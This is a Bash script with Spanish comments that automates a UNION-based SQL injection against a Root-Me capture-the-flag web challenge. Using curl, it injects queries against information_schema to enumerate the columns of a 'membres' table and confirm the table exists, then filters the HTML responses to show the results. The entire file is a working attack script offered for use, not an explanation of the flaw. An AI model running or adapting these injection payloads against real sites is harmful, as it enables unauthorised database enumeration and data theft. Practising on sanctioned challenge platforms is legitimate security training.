#!/bin/bash

# ================================================
# EXPLORAR ESQUEMA DE LA BASE DE DATOS
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  EXPLORANDO ESQUEMA - CH30${NC}"
echo -e "${BLUE}========================================${NC}"

echo -e "\n${YELLOW}[+] Extrayendo nombres de columnas de 'membres'...${NC}"

# Extraer columnas con delimitador
result=$(curl -s "$URL?action=membres&id=1' UNION SELECT 1,CONCAT('###',COLUMN_NAME,'###'),3,4 FROM information_schema.columns WHERE TABLE_NAME='membres'#" \
    | grep -o "###.*###" | sed 's/###//g')

if [ -n "$result" ]; then
    echo -e "${GREEN}[✓] Columnas encontradas:${NC}"
    echo "$result" | while read column; do
        echo -e "  ${GREEN}- $column${NC}"
    done
else
    echo -e "${RED}[✗] No se encontraron columnas${NC}"
    echo -e "\n${YELLOW}[+] Intentando con otro método...${NC}"
    
    # Probar sin delimitador
    result2=$(curl -s "$URL?action=membres&id=1' UNION SELECT 1,COLUMN_NAME,3,4 FROM information_schema.columns WHERE TABLE_NAME='membres'#" \
        | grep -v "login failed" | grep -v "Authentification" | grep -v "iframe" | grep -v "Membres" | grep -v "CREATE" | grep -v "strong" | grep -v "form" | grep -v "input" | grep -v "submit" | grep -v "html" | grep -v "header" | grep -v "body" | grep -v "title" | grep -v "link" | grep -v "script" | grep -v "style" | head -10)
    
    if [ -n "$result2" ]; then
        echo -e "${GREEN}[✓] Columnas encontradas:${NC}"
        echo "$result2"
    else
        echo -e "${RED}[✗] No se encontraron columnas${NC}"
    fi
fi

echo -e "\n${YELLOW}[+] Verificando si la tabla 'membres' existe...${NC}"

# Verificar que la tabla existe
table_check=$(curl -s "$URL?action=membres&id=1' UNION SELECT 1,TABLE_NAME,3,4 FROM information_schema.tables WHERE TABLE_NAME='membres'#" \
    | grep -v "login failed" | grep -v "Authentification" | grep -v "iframe" | grep -v "Membres" | grep -v "CREATE" | grep -v "strong" | grep -v "form" | grep -v "input" | grep -v "submit" | grep -v "html" | grep -v "header" | grep -v "body" | grep -v "title" | grep -v "link" | grep -v "script" | grep -v "style" | head -5)

if [ -n "$table_check" ]; then
    echo -e "${GREEN}[✓] La tabla 'membres' existe${NC}"
else
    echo -e "${RED}[✗] La tabla 'membres' no existe o no se puede acceder${NC}"
fi

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN${NC}"
echo -e "${BLUE}========================================${NC}"
